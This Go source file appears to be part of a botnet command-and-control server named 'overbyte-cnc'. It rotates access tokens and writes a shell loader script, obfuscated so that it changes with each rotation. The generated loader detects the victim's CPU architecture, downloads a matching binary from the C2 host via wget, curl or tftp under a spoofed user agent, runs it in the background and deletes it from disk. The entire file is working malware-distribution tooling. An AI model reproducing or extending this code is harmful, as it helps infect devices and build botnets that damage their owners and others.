package payload

import (
	"bufio"
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"overbyte-cnc/config"
	"overbyte-cnc/logger"
)

type TokenManager struct {
	currentToken string
	mu           sync.RWMutex
	cfg          *config.Config
	stopChan     chan struct{}
	onRotate     func(token string)
}

func NewTokenManager(cfg *config.Config, onRotate func(token string)) *TokenManager {
	return &TokenManager{
		cfg:      cfg,
		stopChan: make(chan struct{}),
		onRotate: onRotate,
	}
}

func (tm *TokenManager) Start() {
	tm.rotate()

	ttl := time.Duration(tm.cfg.Payload.TokenTTL) * time.Minute
	if ttl < time.Minute {
		ttl = 60 * time.Minute
	}

	go func() {
		ticker := time.NewTicker(ttl)
		defer ticker.Stop()
		for {
			select {
			case <-tm.stopChan:
				return
			case <-ticker.C:
				tm.rotate()
			}
		}
	}()

	logger.Info("Token manager started (rotation every %d min)", tm.cfg.Payload.TokenTTL)
}

func (tm *TokenManager) Stop() {
	close(tm.stopChan)
}

func (tm *TokenManager) rotate() {
	token, err := generateToken(32)
	if err != nil {
		logger.Error("Failed to generate token: %v", err)
		return
	}

	tm.mu.Lock()
	tm.currentToken = token
	tm.mu.Unlock()

	logger.Info("Token rotated")

	if tm.onRotate != nil {
		tm.onRotate(token)
	}
}

func (tm *TokenManager) Validate(token string) bool {
	tm.mu.RLock()
	current := tm.currentToken
	tm.mu.RUnlock()

	if current == "" || token == "" {
		return false
	}

	return subtle.ConstantTimeCompare([]byte(current), []byte(token)) == 1
}

func (tm *TokenManager) GetCurrent() string {
	tm.mu.RLock()
	defer tm.mu.RUnlock()
	return tm.currentToken
}

func generateToken(nBytes int) (string, error) {
	b := make([]byte, nBytes)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// ObfuscateTokenForShell splits a token into random chunks with random variable
// names so the loader script looks different every rotation.
func ObfuscateTokenForShell(token string) string {
	chunks := splitRandom(token)
	varNames := make([]string, len(chunks))
	for i := range chunks {
		varNames[i] = randomVarName()
	}

	var sb strings.Builder
	for i, chunk := range chunks {
		sb.WriteString(fmt.Sprintf("%s='%s'\n", varNames[i], chunk))
	}
	sb.WriteString("T=")
	for i, name := range varNames {
		if i > 0 {
			sb.WriteString("$")
		} else {
			sb.WriteString("$")
		}
		sb.WriteString(name)
	}
	sb.WriteString("\n")
	return sb.String()
}

func splitRandom(s string) []string {
	var parts []string
	for len(s) > 0 {
		maxChunk := len(s)
		if maxChunk > 16 {
			maxChunk = 16
		}
		minChunk := 4
		if minChunk > maxChunk {
			minChunk = maxChunk
		}
		n, err := rand.Int(rand.Reader, big.NewInt(int64(maxChunk-minChunk+1)))
		if err != nil {
			parts = append(parts, s)
			break
		}
		chunkLen := int(n.Int64()) + minChunk
		if chunkLen > len(s) {
			chunkLen = len(s)
		}
		parts = append(parts, s[:chunkLen])
		s = s[chunkLen:]
	}
	return parts
}

func randomVarName() string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	length := 3
	n, err := rand.Int(rand.Reader, big.NewInt(4))
	if err == nil {
		length += int(n.Int64())
	}
	name := make([]byte, length)
	name[0] = '_'
	for i := 1; i < length; i++ {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		name[i] = letters[idx.Int64()]
	}
	return string(name)
}

// RewriteLoader regenerates the loader.sh file with a new obfuscated token.
func RewriteLoader(cfg *config.Config, token string) {
	if cfg.Payload.BinsDirectory == "" {
		return
	}

	// Auto-generate loader name if not set
	if cfg.Payload.LoaderName == "" {
		name, err := generateToken(3) // 6 hex chars
		if err != nil {
			logger.Error("Failed to generate loader name: %v", err)
			return
		}
		cfg.Payload.LoaderName = name
		logger.Info("Auto-generated loader name: %s", name)
	}

	binsDir := filepath.Dir(cfg.Payload.BinsDirectory)
	if shFiles, err := filepath.Glob(filepath.Join(binsDir, "*.sh")); err == nil {
		for _, f := range shFiles {
			os.Remove(f)
		}
	}

	loaderPath := filepath.Join(binsDir, cfg.Payload.LoaderName+".sh")

	binaryMapPath := filepath.Join(filepath.Dir(cfg.Payload.BinsDirectory), "binary_map.txt")
	archMap, err := readBinaryMap(binaryMapPath)
	if err != nil {
		logger.Error("Failed to read binary map for loader rewrite: %v", err)
		return
	}

	if len(archMap) == 0 {
		logger.Warn("No binaries in binary_map.txt, skipping loader rewrite")
		return
	}

	port := cfg.Payload.Port
	if port == 0 {
		port = cfg.API.Port
	}

	content := generateLoaderContent(archMap, token, cfg.Payload.UserAgent, port, cfg.Payload.Host, cfg.Payload.HiddenPath)

	if err := os.WriteFile(loaderPath, []byte(content), 0644); err != nil {
		logger.Error("Failed to rewrite loader: %v", err)
		return
	}

	logger.Info("Loader rewritten with new token: %s", loaderPath)
}

func readBinaryMap(path string) (map[string]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	result := make(map[string]string)
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			result[parts[0]] = parts[1]
		}
	}
	return result, scanner.Err()
}

func generateLoaderContent(archMap map[string]string, token, userAgent string, port int, host, hiddenPath string) string {
	basePath := fmt.Sprintf("http://%s:%d/payload", host, port)
	if hiddenPath != "" {
		basePath = fmt.Sprintf("http://%s:%d/payload/%s", host, port, hiddenPath)
	}

	obfToken := ObfuscateTokenForShell(token)

	var sb strings.Builder

	sb.WriteString("#!/bin/sh\n\n")
	sb.WriteString("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /\n\n")

	// Random exec name
	sb.WriteString("N=$(head -c 32 /dev/urandom 2>/dev/null | tr -dc 'a-z' | head -c 6)\n")
	sb.WriteString("[ -z \"$N\" ] && N=$(date +%s | md5sum 2>/dev/null | head -c 6)\n")
	sb.WriteString("[ -z \"$N\" ] && N=\"tmp$$\"\n\n")

	// Arch detection
	sb.WriteString("ARCH=$(uname -m 2>/dev/null)\n")
	sb.WriteString("case \"$ARCH\" in\n")
	sb.WriteString("    x86_64|amd64)           ARCH=\"x86_64\" ;;\n")
	sb.WriteString("    aarch64|arm64)          ARCH=\"aarch64\" ;;\n")
	sb.WriteString("    armv7*|armv7l)          ARCH=\"armv7l\" ;;\n")
	sb.WriteString("    armv6*|armv6l)          ARCH=\"armv6l\" ;;\n")
	sb.WriteString("    armv5*|armv5l)          ARCH=\"armv5l\" ;;\n")
	sb.WriteString("    armv4*|armv4l|arm)      ARCH=\"armv4l\" ;;\n")
	sb.WriteString("    mips64*)                ARCH=\"mips64\" ;;\n")
	sb.WriteString("    mips*)                  ARCH=\"mips\" ;;\n")
	sb.WriteString("    mipsel*|mipsle*)        ARCH=\"mipsel\" ;;\n")
	sb.WriteString("    ppc*|powerpc*)          ARCH=\"powerpc\" ;;\n")
	sb.WriteString("    sh4*)                   ARCH=\"sh4\" ;;\n")
	sb.WriteString("    i?86|i486|i586|i686)    ARCH=\"i686\" ;;\n")
	sb.WriteString("    m68k*)                  ARCH=\"m68k\" ;;\n")
	sb.WriteString("    s390x*)                 ARCH=\"s390x\" ;;\n")
	sb.WriteString("    riscv64*)               ARCH=\"riscv64\" ;;\n")
	sb.WriteString("    *)                      ARCH=\"\" ;;\n")
	sb.WriteString("esac\n\n")

	// Obfuscated token
	sb.WriteString(obfToken)
	sb.WriteString("\n")

	// Fetch function - uses token in query param
	sb.WriteString("fetch() {\n")
	sb.WriteString("    U=\"$1\"; O=\"$2\"\n")
	sb.WriteString("    if command -v wget >/dev/null 2>&1; then\n")
	sb.WriteString("        wget -q -U \"$UA\" -O \"$O\" \"$U?t=$T\" 2>/dev/null && return 0\n")
	sb.WriteString("    fi\n")
	sb.WriteString("    if command -v curl >/dev/null 2>&1; then\n")
	sb.WriteString("        curl -s -A \"$UA\" -o \"$O\" \"$U?t=$T\" 2>/dev/null && return 0\n")
	sb.WriteString("    fi\n")
	sb.WriteString("    if command -v tftp >/dev/null 2>&1; then\n")
	sb.WriteString("        H=$(echo \"$U\" | sed 's|http://||;s|/.*||')\n")
	sb.WriteString("        F=$(echo \"$U\" | sed 's|.*/||')\n")
	sb.WriteString("        tftp -g -r \"$F\" \"$H\" 2>/dev/null && mv \"$F\" \"$O\" 2>/dev/null && return 0\n")
	sb.WriteString("    fi\n")
	sb.WriteString("    return 1\n")
	sb.WriteString("}\n\n")

	// try_run function
	sb.WriteString("try_run() {\n")
	sb.WriteString("    URL=\"$1\"\n")
	sb.WriteString("    fetch \"$URL\" \"$N\" || return 1\n")
	sb.WriteString("    [ ! -f \"$N\" ] && return 1\n")
	sb.WriteString("    [ ! -s \"$N\" ] && { rm -f \"$N\" 2>/dev/null; return 1; }\n")
	sb.WriteString("    chmod +x \"$N\" 2>/dev/null\n")
	sb.WriteString("    ./\"$N\" </dev/null >/dev/null 2>&1 &\n")
	sb.WriteString("    PID=$!\n")
	sb.WriteString("    sleep 1\n")
	sb.WriteString("    if kill -0 $PID 2>/dev/null; then\n")
	sb.WriteString("        rm -f \"$N\" 2>/dev/null\n")
	sb.WriteString("        exit 0\n")
	sb.WriteString("    fi\n")
	sb.WriteString("    rm -f \"$N\" 2>/dev/null\n")
	sb.WriteString("    return 1\n")
	sb.WriteString("}\n\n")

	// Arch -> binary URL mapping
	sb.WriteString("case \"$ARCH\" in\n")
	for arch, bin := range archMap {
		sb.WriteString(fmt.Sprintf("    %s) PRIMARY=\"%s/%s\" ;;\n", arch, basePath, bin))
	}
	// i486/i586 fallback to i686
	if bin, ok := archMap["i686"]; ok {
		sb.WriteString(fmt.Sprintf("    i486|i586) PRIMARY=\"%s/%s\" ;;\n", basePath, bin))
	}
	sb.WriteString("    *) PRIMARY=\"\" ;;\n")
	sb.WriteString("esac\n\n")

	// User-Agent
	sb.WriteString(fmt.Sprintf("UA=\"%s\"\n\n", userAgent))

	// Fallback list
	sb.WriteString("FALLBACK=\"")
	first := true
	for _, bin := range archMap {
		if !first {
			sb.WriteString(" ")
		}
		sb.WriteString(fmt.Sprintf("%s/%s", basePath, bin))
		first = false
	}
	sb.WriteString("\"\n\n")

	// Execute
	sb.WriteString("if [ -n \"$PRIMARY\" ]; then\n")
	sb.WriteString("    try_run \"$PRIMARY\"\n")
	sb.WriteString("fi\n\n")
	sb.WriteString("for BIN in $FALLBACK; do\n")
	sb.WriteString("    [ \"$BIN\" = \"$PRIMARY\" ] && continue\n")
	sb.WriteString("    try_run \"$BIN\"\n")
	sb.WriteString("done\n")

	return sb.String()
}
